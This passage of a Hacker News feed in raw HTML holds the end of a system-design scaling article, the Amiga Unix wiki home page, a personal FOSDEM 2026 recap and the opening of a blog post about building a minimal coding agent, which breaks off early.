srcset="https://substackcdn.com/image/fetch/$s_!tfJp!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F720aa4eb-2654-4e95-a50c-41aba07af610_705x350.png 424w, https://substackcdn.com/image/fetch/$s_!tfJp!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F720aa4eb-2654-4e95-a50c-41aba07af610_705x350.png 848w, https://substackcdn.com/image/fetch/$s_!tfJp!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F720aa4eb-2654-4e95-a50c-41aba07af610_705x350.png 1272w, https://substackcdn.com/image/fetch/$s_!tfJp!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F720aa4eb-2654-4e95-a50c-41aba07af610_705x350.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!tfJp!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F720aa4eb-2654-4e95-a50c-41aba07af610_705x350.png" width="705" height="350" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/720aa4eb-2654-4e95-a50c-41aba07af610_705x350.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:350,&quot;width&quot;:705,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:64549,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://blog.algomaster.io/i/173209644?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F720aa4eb-2654-4e95-a50c-41aba07af610_705x350.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!tfJp!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F720aa4eb-2654-4e95-a50c-41aba07af610_705x350.png 424w, https://substackcdn.com/image/fetch/$s_!tfJp!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F720aa4eb-2654-4e95-a50c-41aba07af610_705x350.png 848w, https://substackcdn.com/image/fetch/$s_!tfJp!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F720aa4eb-2654-4e95-a50c-41aba07af610_705x350.png 1272w, https://substackcdn.com/image/fetch/$s_!tfJp!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F720aa4eb-2654-4e95-a50c-41aba07af610_705x350.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><ol><li><p><strong>Start simple</strong><span>: Don’t optimize for problems you don’t have yet. A single server is fine until it isn’t.</span></p></li><li><p><strong>Measure first</strong><span>: Identify the actual bottleneck before adding infrastructure. CPU-bound problems need different solutions than I/O-bound ones.</span></p></li><li><p><strong>Stateless servers are the prerequisite</strong><span>: You can’t horizontally scale or auto-scale until your servers hold no local state.</span></p></li><li><p><strong>Cache aggressively</strong><span>: Most data is read far more often than written. Caching gives you 10-100x performance improvement for read-heavy workloads.</span></p></li><li><p><strong>Async when possible</strong><span>: Not everything needs to happen in the request path. Email sending, analytics, notifications can all be queued.</span></p></li><li><p><strong>Shard reluctantly</strong><span>: Database sharding is a one-way door with significant complexity. Exhaust other options first.</span></p></li><li><p><strong>Accept trade-offs</strong><span>: Perfect consistency and availability don’t coexist during network partitions. Know which operations truly need strong consistency.</span></p></li><li><p><strong>Complexity has costs</strong><span>: Every component you add is a component that can fail, needs monitoring, requires expertise to operate.</span></p></li></ol><p>The path to scale isn’t about implementing everything at once. It’s about understanding which problems emerge at each stage and applying the right solutions at the right time.</p><p>The best architecture is the simplest one that meets your current needs, with a clear path to evolve when those needs change.</p><p>That’s it. Thank you so much for reading!</p><p>If you found this article helpful, give it a like ❤️ and share it with others.</p><p data-attrs="{&quot;url&quot;:&quot;https://blog.algomaster.io/p/20-dsa-patterns?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share&amp;token=eyJ1c2VyX2lkIjo4MzYwMjc0MywicG9zdF9pZCI6MTg0ODU0MjEwLCJpYXQiOjE3Njk2NTkzMzcsImV4cCI6MTc3MjI1MTMzNywiaXNzIjoicHViLTIyMDIyNjgiLCJzdWIiOiJwb3N0LXJlYWN0aW9uIn0.R5YSXo4Db5g15be6rnNtEUh9Q8ZxltrqcRwS1HpNj1k&quot;,&quot;text&quot;:&quot;Share&quot;,&quot;action&quot;:null,&quot;class&quot;:&quot;button-wrapper&quot;}" data-component-name="ButtonCreateButton"><a href="https://blog.algomaster.io/p/20-dsa-patterns?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share&amp;token=eyJ1c2VyX2lkIjo4MzYwMjc0MywicG9zdF9pZCI6MTg0ODU0MjEwLCJpYXQiOjE3Njk2NTkzMzcsImV4cCI6MTc3MjI1MTMzNywiaXNzIjoicHViLTIyMDIyNjgiLCJzdWIiOiJwb3N0LXJlYWN0aW9uIn0.R5YSXo4Db5g15be6rnNtEUh9Q8ZxltrqcRwS1HpNj1k" rel=""><span>Share</span></a></p><p><span>For more System Design related content, checkout my website </span><a href="https://algomaster.io/" rel="">algomaster.io</a></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Amiga Unix (Amix) (108 pts)]]></title>
            <link>https://www.amigaunix.com/doku.php/home</link>
            <guid>46845244</guid>
            <pubDate>Sun, 01 Feb 2026 10:57:20 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.amigaunix.com/doku.php/home">https://www.amigaunix.com/doku.php/home</a>, See on <a href="https://news.ycombinator.com/item?id=46845244">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="dokuwiki__content">
                
                <p><span>home</span></p>

                <div class="page">
                                                            <!-- wikipage start -->
                    
<p>


<strong>Welcome</strong> to the <strong>Amiga Unix wiki</strong>!
</p>

<p>
<img src="https://www.amigaunix.com/lib/exe/fetch.php/banner_2019.png" loading="lazy" alt="">
</p>

<p>
<strong>Amiga UNIX (also known as “Amix”)</strong> was Commodore's port of AT&amp;T System V Release 4 Unix to the Amiga in 1990. Like many early Unix variants, Amiga Unix never became wildly popular, but it is an interesting sidestep in the history of the Amiga.
</p>

<p>
The two “official” machines that could run Amix were the Amiga 2500UX and 3000UX models, however it can run on any Amiga that meets its <a href="https://www.amigaunix.com/doku.php/requirements" title="requirements" data-wiki-id="requirements">hardware requirements</a>. The awesome Amiga emulator WinUAE has been able to run it since 2013 (version 2.7.0 onwards).
</p>

<p>
This site is dedicated on preserving Amix's history and sharing information and instructions on what Amix is, how to install it (either on real hardware or in emulation) and what can you do with it. Mainly, it tries to cater to people who wish to run AMIX for whatever reason on their hardware. By documenting experiences with it, it is hoped that subsequent SVR4 junkies will find the way more smooth than it might have been without any guidance at all. For even a relatively experienced modern Unix or GNU/Linux administrator, System V UNIX is sufficiently different to present difficulty in installation and administration. Not so much in moving around between directories, and using common utilities that persist to this day - although many of those are hoary and somewhat forgetful in their retirement - but of doing more in depth tasks and understanding the differences.
</p>
<hr>
<figure id="label">
<img src="https://www.amigaunix.com/lib/exe/fetch.php/amix_ebay_2020.jpg?w=500&amp;tok=8084ae" loading="lazy" title=" " alt=" " width="500">
<figcaption><span title="label">Figure 1:</span> <span>In november 2020 a boxed copy of Amix sold for quite a bit of money on eBay.com.au <img src="https://www.amigaunix.com/lib/images/smileys/cool.svg" alt="8-)"> </span></figcaption>
</figure><hr>

<h2 id="table-of-contents">Table of contents</h2>
<p>
<span>
<a href="https://www.amigaunix.com/lib/exe/fetch.php/amiga-3000unix_clean.png" target="_blank" title="https://www.amigaunix.com/lib/exe/fetch.php/amiga-3000unix_clean.png" rel="ugc nofollow noopener"><img src="https://www.amigaunix.com/lib/exe/fetch.php/amiga-3000unix_clean_small.jpg?w=350&amp;tok=f6e638" loading="lazy" title=" " alt=" " width="350"></a>
<br>

Amiga 3000UX Advert (thanks to <a href="https://www.1000bit.it/" target="_blank" title="https://www.1000bit.it/" rel="ugc nofollow noopener">1000bit.it</a>!)
</span>
</p>

<h3 id="history-and-documentation">History and Documentation</h3>


<h3 id="hardware">Hardware</h3>


<h3 id="tutorials-how-to-s">Tutorials &amp; How-to's</h3>


<h3 id="software">Software</h3>


<h3 id="general-topics">General topics</h3>


<h3 id="links">Links</h3>
<div>
<ul>
<li>
</li>
<li>
</li>
<li><p> Article about Amix in “Virtually Fun” blog: <a href="https://virtuallyfun.com/wordpress/2013/01/13/amix/" target="_blank" title="https://virtuallyfun.com/wordpress/2013/01/13/amix/" rel="ugc nofollow noopener">AMIX</a> (2013).</p>
</li>
<li><p> WinUAE and the beginnings of Amix support <a href="http://eab.abime.net/showthread.php?t=67210" target="_blank" title="http://eab.abime.net/showthread.php?t=67210" rel="ugc nofollow noopener">in EAB forums</a></p>
</li>
<li><p> Great Amix site with re-done manuals and other useful files (in german): <a href="http://www.amigaunix.de/" target="_blank" title="http://www.amigaunix.de" rel="ugc nofollow noopener">http://www.amigaunix.de</a></p>
</li>
<li>
</li>
<li>
</li>
<li><p> Old, and riddled with Spam, but there once was a thriving Newsgroup dedicated to Amiga Unix. Seeing the Internet “never forgets”, you can find the old discussions at Google Groups: <a href="https://groups.google.com/forum/#!forum/comp.unix.amiga" target="_blank" title="https://groups.google.com/forum/#!forum/comp.unix.amiga" rel="ugc nofollow noopener">https://groups.google.com/forum/#!forum/comp.unix.amiga</a></p>
</li>
</ul>
<hr>
<p>
<strong>Wanted</strong>: content for this site! Do you have a piece of third-party software for Amix? Copy of an exotic hardware driver? Would you like to help write guides? Have copy of files from <em>litamiga.epfl.ch</em> or <em>amiga.physik.unizh.ch</em>? <a href="https://amigaunix.com/contact/contact.html" target="_blank" title="https://amigaunix.com/contact/contact.html" rel="ugc nofollow noopener">Please let us know!</a>
</p><hr>

<p>
<img src="https://www.amigaunix.com/lib/exe/fetch.php/c-banner.jpg" loading="lazy" alt=""> <strong>Why would you like to try Amix?</strong> The short answer is, you don't want it. Stay with me for just a minute here.
</p>

<p>
Amiga UNIX is really, really real UNIX. AT&amp;T System V Release 4, ported by a team at Commodore that quit the day that 1.0 was released - at least, as legend has it. All the releases have their share of issues, and none of them have been updated in well over a decade. It runs on old hardware that was expensive when new and hard enough to find now that “RARE!” tags on eBay aren't hyperbole for once. You can cheat and get it installed without the tape drive, at least, but it's not for the faint of heart and has its own caveats such as a completely broken package system.
</p>

<p>
Think for a minute about your goals before embarking on this journey. If you're a die-hard Amiga user - and we all know they are still out there - interested in trying this UNIX thing, because you've heard about Mac <abbr title="Operating System">OS</abbr> X and that's based on UNIX, but before you swap out Kickstart for init you'd like to kick the tires on Amiga UNIX…
</p>

<p>
Don't.
</p>

<p>
Ten minutes with Amiga UNIX will have some Amiga users reaching for their 3.1 floppies. Actually, two minutes with the installer might have the same effect. That's just not fair to UNIX, whether it's GNU/Linux, Solaris, FreeBSD, or whatever. The environment has come a long way in the years and years since Amiga UNIX was shiny and new, rather than bitter and tarnished. Your average Ubuntu user will have set fire to their house trying to expunge any evidence of the unforgiving AMIX installation. Did I mention it hasn't been updated in a decade? Put your Amiga UNIX machine on the net with no firewall and you may see it rooted faster than a Win98SE box running IE5.
</p>

<p>
Finally, and this is a biggie, there is no future for AMIX. Its kernel, libc, and much of its software is closed source, so when Commodore folded its story was over. It was put to pasture even as free UNIX environments began to be truly plausible contenders for commercial UNIX, and largely forgotten.
</p>

<p>
So this is quite the happy page, isn't it? Why would you want to install AMIX?
</p>

<p>
There's really only one reason. Well, two, if you count being an idiot like us. That reason is simple curiosity. If you'd like to put yourself in the shoes of an aspiring systems programmer in the early nineties, go for it. If you find the legacy of the ever growing open source operating system revolution fascinating, AMIX could prove instructive. If you're trying to impress bearded UNIX gurus with arcane knowledge from the times when men were men, and 16MB was a ton of RAM, the dwindling lore of System V might be the key. These days, Amiga UNIX is all about history and learning.
</p>

<p>
So if you have the requisite hardware and you have girded yourself for what is in store for you should you venture into the m68k-cbm-sysv4 dungeon, you might enjoy this site and the dusty treasures it contains. But seriously, if you just want to try UNIX or GNU/Linux out, the most expedient way to do it is on x86 or just something better supported on Amiga hardware. There are lots of choices for you.
</p>

<p>
Good luck, and enjoy!
</p>
<hr>
<div>
<h2 id="acknowledgements">Acknowledgements</h2>

<p>
Thanks to Folkert “Tahoe” de Gans for hosting the site!
</p>

<p>
Thanks to Ville Laustela for images &amp; scans and updating the Wiki.
</p>

<p>
Thanks to Toni Wilen for maintaining the WinUAE emulator and making it possible to run Amix inside it.
</p>

<p>
Dedicated to Andrew “Failsure” Whitlock, the original creator and maintainer of this site. <a href="https://www.dignitymemorial.com/obituaries/atlanta-ga/andrew-whitlock-7629725" target="_blank" title="https://www.dignitymemorial.com/obituaries/atlanta-ga/andrew-whitlock-7629725" rel="ugc nofollow noopener">RIP, agw.</a>
</p>
</div>
<p>
<a href="https://www.amigaunix.com/lib/exe/fetch.php/amix_1.jpg" title="amix_1.jpg"><img src="https://www.amigaunix.com/lib/exe/fetch.php/amix_1.jpg?w=420&amp;tok=dcf24e" loading="lazy" alt="" width="420"></a>
</p>

</div>

                    <!-- wikipage stop -->
                                    </div>

                <div><bdi>home.txt</bdi><p> · Last modified: 2023/07/09 19:32 by </p><bdi>wiki_admin</bdi></div>

                
                <hr>
            </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[FOSDEM 2026 – Open-Source Conference in Brussels – Day#1 Recap (175 pts)]]></title>
            <link>https://gyptazy.com/blog/fosdem-2026-opensource-conference-brussels/</link>
            <guid>46845103</guid>
            <pubDate>Sun, 01 Feb 2026 10:30:41 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://gyptazy.com/blog/fosdem-2026-opensource-conference-brussels/">https://gyptazy.com/blog/fosdem-2026-opensource-conference-brussels/</a>, See on <a href="https://news.ycombinator.com/item?id=46845103">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<article>
 <i>(<time datetime="2026-01-31">2026-01-31</time>)</i>:
<p>
<a href="https://fosdem.org/2026/">FOSDEM</a>, the Free and Open Source Developers’ European Meeting, is <a href="https://gyptazy.com/blog/fosdem-2025-opensource-conference-brussels/">an annual pilgrimage for open source enthusiasts</a> from all over the world. What started as a small gathering in 2000, originally named the Open Source Developers of Europe Meeting (OSDEM), has grown into one of the most significant conferences dedicated to free and open source software.</p>
<p>
In 2026, FOSDEM felt more purposeful than ever. The conference clearly reflected a growing awareness around digital sovereignty and Europe’s technological future.</p>

 <figure>
  <img src="https://cdn.gyptazy.com/img/fosdem2026-sovereignity.jpg" alt="FOSDEM 2026 - Sovereignity" width="321" height="151" loading="lazy" decoding="async">
  <figcaption>
    FOSDEM 2026 - Sovereignity.
  </figcaption>
</figure>

<p>
Self hosted solutions, open infrastructure, and community driven software were no longer niche topics. They were central to many discussions and presentations. The focus has visibly shifted away from convenience first and centralized platforms and toward systems that put control, transparency, and resilience back into the hands of users and communities.
This shift was ily supported by established communities such as the FreeBSD project, which continues to demonstrate how long term, openly governed systems can serve as reliable foundations for sovereign infrastructure. At the same time, smaller but equally important projects showed how grassroots innovation drives real change. Talks like <a href="https://fosdem.org/2026/schedule/speaker/hyacinthe_cartiaux/">Hyacinthe’s</a> <a href="https://fosdem.org/2026/schedule/event/RPJHYK-automating_bgp_peerings_in_the_dn42_environment/">FlipFlap presentation on the DN42 network</a> highlighted decentralized and community operated networking in practice, while <a href="https://fosdem.org/2026/schedule/event/BGPF3M-smolbsd/">Emile’s talk on SmolBSD</a> demonstrated how minimal, purpose built BSD systems can bring clarity, auditability, and long term maintainability back to operating system design.
Projects such as <a href="https://boxybsd.com/">BoxyBSD</a>, crafted by <a href="https://gyptazy.com/">gyptazy</a>, showcased how lowering the barrier to learning BSD based systems empowers the next generation of open source contributors. By providing free invite codes during FOSDEM, BoxyBSD made hands on experimentation immediately accessible and reinforced the conference’s spirit of openness and community support.</p><p>
FOSDEM 2026 made one thing unmistakably clear. Open source is no longer just about software freedom. It is increasingly about independence, sustainability, and Europe’s ability to shape its own digital future.
</p>

<h2>Arrival at FOSDEM 2026</h2>
<p>
Like every year, I decided to travel to FOSDEM by car. It’s actually the most relaxed way for me to get there as I can simply drive at any time in the morning, but it comes with one clear disadvantage: you have to arrive very early to secure a parking spot directly on campus. That means starting the journey long before the city fully wakes up. Overall, the travel time is more or less the same as taking the train, so that part doesn’t really matter. What does matter is the flexibility and being able to move around freely and head back home whenever I want. Since I usually only attend the first day of FOSDEM, that flexibility makes the early start worth it.
</p>

<p>
This year, the effort paid off once again. I ended up being the first car in line at the gate leading to the parking area. Better safe than sorry. Anyone who has attended FOSDEM knows that parking nearby is a small victory that can shape the rest of the day.
</p>

<p>
After parking, there was time to slow down a bit. Before the talks began, the campus gradually filled with familiar faces. FOSDEM has a unique rhythm in the early morning hours, when everything is still calm and conversations happen without rushing from room to room.
</p>

<p>
I met up with a few friends, and we took the opportunity to catch up and exchange a few thoughts before the day properly started. With coffees and croissants in hand, we waited for the opening talk. It was a simple moment, but one that perfectly captured the atmosphere of FOSDEM: a mix of anticipation, community, and shared curiosity about what the weekend would bring.
</p>

<h2>My Talk-Schedule at FOSDEM 2026</h2>
<p>
My personal schedule at FOSDEM followed a clear thread: understanding infrastructure from the lowest layers up to real-world, community operated systems. Rather than chasing trends, I focused on talks that explored control, reliability, and long term sustainability.
</p>

<ul>
  <li>Rust-VMM</li>
  <li>Garage S3 Best Practices</li>
  <li>Mobility of Virtual Machines in Kubernetes Clusters</li>
  <li>SmolBSD</li>
  <li>FlipFlap Network in DN42</li>
</ul>

<p>
The <i>Rust-VMM</i> talk set the tone by diving into modern virtualization foundations built with memory safety in mind. It highlighted how Rust enables a new generation of virtual machine monitors that reduce entire classes of bugs while still meeting strict performance requirements. For anyone working close to hardware or hypervisors, it was a i argument for rethinking traditional systems programming choices.
</p>

<p>
With <i>Garage S3 Best Practices</i>, the focus shifted from design to day-to-day operations. Object storage is often treated as a commodity, yet the talk made it clear how many subtle challenges exist around consistency, failure handling, and scaling. Real operational lessons and practical advice emphasized that running storage reliably is just as important as building it.
</p>

<p>
The talk on <i>Mobility of Virtual Machines in Kubernetes Clusters</i> explored the increasingly blurred line between classical virtualization and container orchestration. It showed how virtual machines can move and adapt within Kubernetes environments, combining the i isolation of VMs with the flexibility of cloud native tooling. This hybrid approach challenges the idea that platforms must choose one model exclusively.
</p>

<p>
<i>SmolBSD</i> brought a refreshing focus on minimalism. Instead of adding more layers, the project embraces small, understandable systems that are easier to audit and maintain over time. The talk reinforced the idea that simplicity is not a limitation but a strategic choice, especially for long lived infrastructure.
</p>

<p>
Finally, <i>FlipFlap Network in DN42</i> connected many of the earlier themes through a community perspective. DN42 demonstrates how decentralized, self operated networking can work in practice. The talk showcased automation, experimentation, and cooperation in a real network built by its users, highlighting the educational and innovative power of grassroots infrastructure.
</p>

 <figure>
  <img src="https://cdn.gyptazy.com/img/fosdem2026-flipflip-boxybsd-gyptazy-hcartiaux.jpg" alt="FOSDEM 2026 - FlipFlap Network in DN42 mentioning BoxyBSD by gyptazy" width="321" height="151" loading="lazy" decoding="async">
  <figcaption>
    FOSDEM 2026 - FlipFlap Network in DN42 mentioning BoxyBSD by gyptazy.
  </figcaption>
</figure>

<p>
Together, these talks formed a coherent journey through modern open infrastructure: from safe low level building blocks to resilient storage, hybrid orchestration models, minimal operating systems, and community driven networks.
</p>

<h2>Best of...</h2>
<p>
One of my personal highlights of FOSDEM 2026 was a wonderfully simple yet brilliant idea by the Mozilla Foundation: giving away free cookies. It turned out to be more than just snacks. It was a fun little game, a great conversation starter, and the selection of cookies was genuinely excellent. You might have come for open source, but you probably left liking cookies even more than before.
</p>

<figure>
  <img src="https://cdn.gyptazy.com/img/fosdem2026-mozilla-cookies.jpg" alt="FOSDEM 2026 - Mozilla with free cookies" width="121" height="151" loading="lazy" decoding="async">
  <figcaption>
    FOSDEM 2026 - Mozilla with free cookies.
  </figcaption>
</figure>

<p>
Another standout moment was the talk <a href="https://fosdem.org/2026/schedule/event/VZXKQW-officesuitechallenges/">The Challenges of FLOSS Office Suites</a> by <a href="https://fosdem.org/2026/schedule/speaker/michael_meeks/">Michael Meeks</a>, where he dove into the technical details behind Collabora Online. It was an absolute pleasure to listen to. What made the talk special was not only the depth of technical insight, but also the way it was presented. Complex topics were explained clearly, with context and humor, making it accessible without oversimplifying.
</p>

<figure>
  <img src="https://cdn.gyptazy.com/img/fosdem2026-collabra-online.jpg" alt="FOSDEM 2026 - Sovereignty" width="121" height="151" loading="lazy" decoding="async">
  <figcaption>
    FOSDEM 2026 - Sovereignty.
  </figcaption>
</figure>

<p>
I was genuinely amazed by how the challenges of building and maintaining a full-featured, open source office suite were laid out so honestly. The talk went far beyond architecture diagrams and performance considerations and gave real insight into the long-term effort required to keep such critical software alive and competitive.
</p>

<p>
Beyond the talks, I also took the opportunity to have some great conversations at the booths. I chatted with <a href="https://x.com/fixoulab">fixoulab</a> at the <a href="https://proxmox.com/">Proxmox booth</a> and with the <a href="https://xcp-ng.org/">XCP-ng</a> team at <a href="https://vates.tech/en/about-vates/meet-the-team/">Vates</a>, where I got an early look at the newly released <a href="https://xen-orchestra.com/#!/xo-home">Orchestra</a> features. It was especially interesting since I had not yet found the time to dive into them in detail.
</p>

<p>
On a more personal note, I was truly grateful to meet many of my friends from different countries again. Being able to jump into great talks together, exchange impressions on the spot, and continue discussions afterwards is something that makes FOSDEM special in a way no recording or live stream ever could.
</p>

<h2>What the heck is going on at the FOSDEM 2026?</h2>
<p>
FOSDEM has always been crowded. Anyone who has attended more than once knows the familiar experience of packed hallways, full lecture rooms, and sprinting between buildings in the hope of catching the last five minutes of a talk. As the biggest open source conference in the world, this has long been part of its identity. But in 2026, it felt like something had shifted.
</p>

<p>
There is no doubt that the growing interest in free and open source software is a good thing. More people take open source seriously, more organizations depend on it, and more contributors want to get involved. That energy was clearly visible everywhere. At the same time, it felt like FOSDEM was reaching — or perhaps exceeding — its natural limits. Rooms filled faster than ever, informal discussions became harder to have, and the sheer density of people sometimes worked against the very openness the conference is known for.
</p>

<p>
A major driver behind this growth is the current political and economic climate. Topics like digital sovereignty, technological independence, and reducing reliance on a small number of dominant market players were more present than ever. This was not subtle. It was visible across the schedule, in hallway conversations, and especially during the Friday pre-conferences, where these themes were actively pursued and debated.
</p>

<p>
On one hand, this focus is both necessary and overdue. Open source has always been political in the sense that it is about control, transparency, and autonomy, even when it pretended not to be. Seeing these discussions move to the center stage at FOSDEM is encouraging. It shows that the community understands the stakes and is willing to engage with the broader implications of the technology it builds.
</p>

<p>
On the other hand, the intensity of this shift raises uncomfortable questions. When everything becomes urgent and strategic, the space for experimentation, learning, and smaller niche projects risks being squeezed out. Not every open source project exists to solve geopolitical problems, and not every contributor arrives with a policy agenda. FOSDEM has always thrived on its diversity of motivations, and maintaining that balance will be increasingly challenging.
</p>

<p>
FOSDEM 2026 felt like a conference at a crossroads. Its success is undeniable, but so are the growing pains that come with it. The challenge for the coming years will be finding ways to scale without losing what made the event special in the first place: accessibility, spontaneity, and the feeling that there is room for everyone and not just for the loudest or most timely topics. And while I already criticized this last year, this becomes even more important this year.
</p>

<p>
The conversations happening now are important, and it is good that they are happening at FOSDEM. But if the conference is to remain sustainable, both logistically and culturally, it will need to evolve just as thoughtfully as the open source ecosystem it represents.
</p>

<h2>Final Thoughts</h2>
<p>
It is genuinely great to see that FOSDEM remains free and open to everyone, even as the topics it covers become more complex and more relevant. The growing focus on moving away from big tech and reclaiming ownership of our data shows that the community is paying attention to what truly matters. These discussions are necessary, and it is encouraging to see them reflected so clearly in the talks and hallway conversations.
</p>

<p>
The quality of the talks was high, and the people were, as always, amazing. FOSDEM continues to be a place where curiosity, expertise, and openness meet. At the same time, the question of scale can no longer be ignored. Camping in front of a single room just to make sure you can attend a talk is not a sustainable solution. In many cases, it may even discourage the people who are genuinely interested but cannot afford to wait for hours or navigate overcrowded spaces.
</p>

<p>
For exactly this reason, I seriously considered staying home this year and watching the talks via live streams or recordings. From a purely technical perspective, that would have worked just fine. The content would still be there, accessible and well produced.
</p>

<p>
But in the end, FOSDEM is not just about talks. It is about meeting people, reconnecting with friends, and having spontaneous conversations that no video stream can fully replace. Seeing all of you again, sharing thoughts over coffee, and exchanging ideas in person ultimately mattered more than comfort or convenience.
</p>

<p>
FOSDEM 2026 once again proved why this conference is special. The challenge now is to ensure that it can continue to grow without losing the openness and accessibility that define it. That balance will shape what FOSDEM becomes in the years to come.
</p>
</article>

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Netbird a German Tailscale alternative (P2P WireGuard-based overlay network) (633 pts)]]></title>
            <link>https://netbird.io/</link>
            <guid>46844870</guid>
            <pubDate>Sun, 01 Feb 2026 09:44:01 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://netbird.io/">https://netbird.io/</a>, See on <a href="https://news.ycombinator.com/item?id=46844870">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[What I learned building an opinionated and minimal coding agent (343 pts)]]></title>
            <link>https://mariozechner.at/posts/2025-11-30-pi-coding-agent/</link>
            <guid>46844822</guid>
            <pubDate>Sun, 01 Feb 2026 09:33:46 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://mariozechner.at/posts/2025-11-30-pi-coding-agent/">https://mariozechner.at/posts/2025-11-30-pi-coding-agent/</a>, See on <a href="https://news.ycombinator.com/item?id=46844822">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>



<p>2025-11-30</p>

<figure>
<img src="https://mariozechner.at/posts/2025-11-30-pi-coding-agent/media/header.png">
<figcaption>It's not much, but it's mine</figcaption>
</figure>


<div>
<ul><li><a href="#toc_0">pi-ai and pi-agent-core</a><ul><li><a href="#toc_1">There. Are. Four. Ligh... APIs</a></li><li><a href="#toc_2">Context handoff</a></li><li><a href="#toc_3">We live in a multi-model world</a></li><li><a href="#toc_4">Structured split tool results</a></li><li><a href="#toc_5">Minimal agent scaffold</a></li></ul></li><li><a href="#toc_6">pi-tui</a><ul><li><a href="#toc_7">Two kinds of TUIs</a></li><li><a href="#toc_8">Retained mode UI</a></li><li><a href="#toc_9">Differential rendering</a></li></ul></li><li><a href="#toc_10">pi-coding-agent</a><ul><li><a href="#toc_11">Minimal system prompt</a></li><li><a href="#toc_12">Minimal toolset</a></li><li><a href="#toc_13">YOLO by default</a></li><li><a href="#toc_14">No built-in to-dos</a></li><li><a href="#toc_15">No plan mode</a></li><li><a href="#toc_16">No MCP support</a></li><li><a href="#toc_17">No background bash</a></li><li><a href="#toc_18">No sub-agents</a></li></ul></li><li><a href="#toc_19">Benchmarks</a></li><li><a href="#toc_20">In summary</a></li></ul>
</div>

<p>In the past three years, I've been using LLMs for assisted coding. If you read this, you probably went through the same evolution: from copying and pasting code into <a href="https://chatgpt.com/">ChatGPT</a>, to <a href="https://github.com/features/copilot">Copilot</a> auto-completions (which never worked for me), to <a href="https://cursor.com/">Cursor</a>, and finally the new breed of coding agent harnesses like <a href="https://claude.ai/code">Claude Code</a>, <a href="https://github.com/openai/codex">Codex</a>, <a href="https://ampcode.com/">Amp</a>, <a href="https://factory.ai/">Droid</a>, and <a href="https://opencode.ai/">opencode</a> that became our daily drivers in 2025.</p>
<p>I preferred Claude Code for most of my work. It was the first thing I tried back in April after using Cursor for a year and a half. Back then, it was much more basic. That fit my workflow perfectly, because I'm a simple boy who likes simple, predictable tools. Over the past few months, Claude Code has turned into a spaceship with 80% of functionality I have no use for. The <a href="https://mariozechner.at/posts/2025-08-03-cchistory/">system prompt and tools also change</a> on every release, which breaks my workflows and changes model behavior. I hate that. Also, it flickers.</p>
<p>I've also built a bunch of agents over the years, of various complexity. For example, <a href="https://sitegeist.ai/">Sitegeist</a>, my little browser-use agent, is essentially a coding agent that lives inside the browser. In all that work, I learned that context engineering is paramount. Exactly controlling what goes into the model's context yields better outputs, especially when it's writing code. Existing harnesses make this extremely hard or impossible by injecting stuff behind your back that isn't even surfaced in the UI.</p>
<p>Speaking of surfacing things, I want to inspect every aspect of my interactions with the model. Basically no harness allows that. I also want a cleanly documented session format I can post-process automatically, and a simple way to build alternative UIs on top of the agent core. While some of this is possible with existing harnesses, the APIs smell like organic evolution. These solutions accumulated baggage along the way, which shows in the developer experience. I'm not blaming anyone for this. If tons of people use your shit and you need some sort of backwards compatibility, that's the price you pay.</p>
<p>I've also dabbled in self-hosting, both locally and on <a href="https://datacrunch.io/">DataCrunch</a>. While some harnesses like opencode support self-hosted models, it usually doesn't work well. Mostly because they rely on libraries like the <a href="https://sdk.vercel.ai/">Vercel AI SDK</a>, which doesn't play nice with self-hosted models for some reason, specifically when it comes to tool calling.</p>
<p>So what's an old guy yelling at Claudes going to do? He's going to write his own coding agent harness and give it a name that's entirely un-Google-able, so there will never be any users. Which means there will also never be any issues on the GitHub issue tracker. How hard can it be?</p>
<p>To make this work, I needed to build:</p>
<ul>
